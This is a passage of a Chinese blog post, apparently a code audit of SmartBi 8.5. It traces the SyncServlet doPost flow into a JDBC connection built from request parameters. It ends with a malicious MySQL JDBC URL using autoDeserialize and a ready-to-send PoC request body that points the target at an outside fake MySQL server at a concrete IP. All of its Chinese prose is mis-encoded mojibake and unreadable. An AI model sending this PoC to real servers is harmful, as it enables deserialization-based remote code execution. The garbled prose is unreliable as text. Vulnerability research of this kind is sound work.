<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">servlet&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">		&lt;</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;SyncServlet&lt;/</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">		&lt;</span><span style="color: #E06C75">servlet-class</span><span style="color: #ABB2BF">&gt;smartbi.freequery.sync.SyncServlet&lt;/</span><span style="color: #E06C75">servlet-class</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">	&lt;/</span><span style="color: #E06C75">servlet</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">	&lt;</span><span style="color: #E06C75">servlet-mapping</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">		&lt;</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;SyncServlet&lt;/</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">		&lt;</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;/vision/SyncServlet&lt;/</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">	&lt;/</span><span style="color: #E06C75">servlet-mapping</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>
</li>
<li><p>åœ¨ SyncServlet çš„ doPost â½…æ³•ä¸­ï¼Œ (new SyncResources()).synchronize(type, dbSe rver, clientId, dbUser, fieldName, querySql) ä¸­å°†æ¥å—çš„å‚æ•°ä¼ â¼Š synchronize ä¸­</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173531532.png" srcset="/img/loading.gif" lazyload alt="image-20250812185324525"></p>
</li>
<li><p>è·Ÿè¿›synchronize </p>
<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">synchronize</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbType</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbServer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbName</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbUser</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbPass</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> querySql) throws Exception {</span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Connection</span><span style="color: #E06C75"> conn </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">DbUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getConnection</span><span style="color: #ABB2BF">(dbType, dbServer, dbName, dbUser, dbPass, (String)</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//è·Ÿè¿›</span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (conn </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">IllegalArgumentException</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getLanguageValue</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> colsCount </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">8</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">Reader</span><span style="color: #E06C75"> reader </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ResultSetReader</span><span style="color: #E06C75">(conn</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> querySql</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> colsCount)</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">DictTree</span><span style="color: #E06C75"> tree </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">DictTree</span><span style="color: #E06C75">(reader)</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doSynchronize</span><span style="color: #ABB2BF">(tree);</span></span>
<span class="line"><span style="color: #E06C75">        }</span></span>
<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure>
</li>
<li><p>è·Ÿè¿› DbUtil.getConnection(â€¦) ä¸­</p>
<p>ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ† ï¼š</p>
<p>æ£€æŸ¥æ˜¯å¦â½€æŒ dbType ç±»å‹çš„æ•°æ®åº“è¿æ¥</p>
<p>æ ¹æ®ä¼ â¼Šå‚æ•°ï¼Œæ‹¼æ¥æ•°æ®åº“è¿æ¥æº</p>
<p>é…ç½®ä¿¡æ¯ï¼Œè¿›â¾è¿æ¥</p>
<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Connection</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getConnection</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbType</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbServer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbName</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbUser</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbPass</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> connName) throws Exception {</span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">DBType</span><span style="color: #E06C75"> driverType </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">            driverType </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">DBType</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">valueOf</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dbType</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toUpperCase</span><span style="color: #ABB2BF">());</span><span style="color: #7F848E; font-style: italic">//åˆ¤æ–­dbTypeæ‰‹æœºéƒ½åœ¨æ•°æ®åº“ç±»å‹è¡¨ä¸­</span></span>
<span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">var9</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] drvInfo </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">translateDriverInfo</span><span style="color: #E06C75">(driverType</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> dbServer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> dbName)</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//é€šè¿‡ä¼ å…¥çš„å‚æ•°è¿›è¡Œurlæ‹¼æ¥</span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (drvInfo </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">DefaultConnectionInfo</span><span style="color: #E06C75"> info </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">DefaultConnectionInfo</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setId</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UUIDGenerator</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">generate</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setName</span><span style="color: #ABB2BF">(connName);</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDriverType</span><span style="color: #ABB2BF">(driverType);</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDriver</span><span style="color: #ABB2BF">(drvInfo[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">]);</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setUrl</span><span style="color: #ABB2BF">(drvInfo[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">]);</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setUser</span><span style="color: #ABB2BF">(dbUser);</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setPassword</span><span style="color: #ABB2BF">(dbPass);</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ConnectionPool</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getConnection</span><span style="color: #ABB2BF">(info);</span></span>
<span class="line"><span style="color: #E06C75">        }</span><span style="color: #7F848E; font-style: italic">//é…ç½®æ•°æ®åº“è¿æ¥ä¿¡æ¯ï¼Œå¹¶ä¸”è¿›è¡Œè¿æ¥</span></span>
<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure>
</li>
<li><p>æœ€é‡è¦çš„éƒ¨åˆ†åœ¨ç¬¬â¼†å—ï¼Œæ‹¼æ¥æ¶æ„çš„æ•°æ®åº“è¿æ¥æº</p>
<p>serverNameè®¾ç½®ä¸ºæˆ‘ä»¬çš„fakemysqlæœåŠ¡å™¨ï¼ŒdbNameæ ¹æ®mysql-connectionçš„ç‰ˆæœ¬è¿›â¾é…ç½®ï¼ˆè¿™â¾¥ä¸º 5.1.44ç‰ˆæœ¬ï¼‰</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">jdbc:mysql://xxx.xxx.xxx.xxx:3306/jdbcdec03db?detectCustomCollations=true%2</span></span>
<span class="line"><span style="color: #abb2bf">6autoDeserialize=yes</span></span></code></pre></div></div></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173534696.png" srcset="/img/loading.gif" lazyload alt="image-20250812190104269"></p>
</li>
<li><p>æ ¹æ®doPostâ½…æ³•ä¸­æ¥å—å‚æ•°åï¼Œæ„é€ pocå³å¯ï¼ˆæ³¨æ„&amp;éœ€è¦è¿›â¾URLç¼–ç ï¼‰</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">type=sqldictsync&amp;dbNameOnly=false&amp;dbType=MYSQL&amp;dbServer=101.36.122.13:3308&amp;</span></span>
<span class="line"><span style="color: #abb2bf">dbName=dec03db?detectCustomCollations=true%26autoDeserialize=yes</span></span></code></pre></div></div></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173537603.png" srcset="/img/loading.gif" lazyload alt="image-20250812190132144"></p>
</li>
</ol>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Java/" class="category-chain-item">Java</a>
  
  
    <span>></span>
    
  <a href="/categories/Java/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">ä»£ç å®¡è®¡</a>
  
  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#Javaä»£ç å®¡è®¡</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>SmartBi-8.5æ­å»º&amp;&amp;å®¡è®¡</div>
      <div>http://example.com/2025/10/27/SmartBi-8.5æ­å»º&amp;&amp;å®¡è®¡/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Piggy Sprint</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2025å¹´10æœˆ27æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/10/27/wuzhicms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="wuzhicmsä»£ç å®¡è®¡">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">wuzhicmsä»£ç å®¡è®¡</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/10/27/P%20y%20t%20h%20o%20n%20%E5%AD%A6%20%E4%B9%A0%20%E7%AC%94%20%E8%AE%B0/" title="Pythonå­¦ä¹ ç¬”è®°">
                        <span class="hidden-mobile">Pythonå­¦ä¹ ç¬”è®°</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","appKey":"byZ7eSN7DH9MXIyDyXwXE8SE","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>







  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">è½½å…¥å¤©æ•°...</span> <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span> <script src="/custom/RunTime/RunTime.js"></script> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="busuanzi_value_site_pv"></span>
         æ¬¡
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="busuanzi_value_site_uv"></span>
         äºº
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="/custom/LoadingBar/pace.min.js"></script>
<script src="/js/scrollAnimation.js"></script>
<script src="/js/snow.js"></script>
<script src="/custom/ReadingProgress/ReadingProgress.js"></script>
<script src="/js/DynamicLine.js"></script>
<script src="/js/RandomBanner.js"></script>
<script src="/js/Sidebar.js"></script>
<script src="/js/Background.js"></script>



<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
<!-- hexo injector body_end start -->
<script src="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.js"></script>

  <script>
  const CODE_CONFIG = {
    beautify: true,
    highlightCopy: true,
    highlightLang: true,
    highlightHeightLimit: 360,
    isHighlightShrink: false,
    copy: {
      success: 'Copy Success',
      error: 'Copy Error',
      noSupport: 'Browser Not Support',
    }
  };
  console.log(
    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
    "color: #fff; background: #5f5f5f",
    "color: #fff; background: #80c8f8",
    ""
  );
  </script>
  <!-- hexo injector body_end end --></body>
</html>
